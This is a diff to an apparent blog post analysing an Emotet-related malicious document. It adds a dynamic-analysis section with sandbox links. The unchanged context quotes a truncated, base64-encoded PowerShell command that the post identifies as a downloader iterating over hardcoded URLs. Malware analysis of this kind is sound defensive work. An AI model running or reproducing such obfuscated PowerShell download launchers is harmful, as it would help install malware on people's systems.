@@ -84,7 +84,7 @@ From the report we see a call to PowerShell with a long string of characters fol
 >> powersheLL -e JABWAEgAVQBLAFEAZgBmAHcAPQAnAEEASABEAEoAQgByAGcAYgAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBzAEUAYABDAFUAUgBJAGAAVABZAFAAYABSAG8AdABvAGAAYwBvAEwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABXAFEAUQBNAEQAcwBnAGEAIAA9ACAAJwA3ADEAMgAnADsAJABRAEwAUABF….
 ```
 
-##  Static code analysis:
+#  Static code analysis:
 The PowerShell code is acting as a downloader with a hardcoded list of URLs to iterate through.
 
 ![alt text](https://Rayferrufino.github.io/assets/pic6.png "Logo Title Text 1")
@@ -118,3 +118,20 @@ https://feodotracker.abuse.ch/browse/host/74.120.55.163/
 ```ruby
 https://app.any.run/tasks/800484d8-7d39-40ef-a4ac-3ba54481696b/
 ```
+
+
+# Dynamic analysis:
+
+## Submitting the dropped binary to a public sandbox further points to it being related to Emotet.
+
+```ruby
+https://capesandbox.com/submit/status/49440/
+```
+![alt text](https://Rayferrufino.github.io/assets/pic8.png "Logo Title Text 1")
+
+![alt text](https://Rayferrufino.github.io/assets/pic9.png "Logo Title Text 1")
+
+
+
+
+
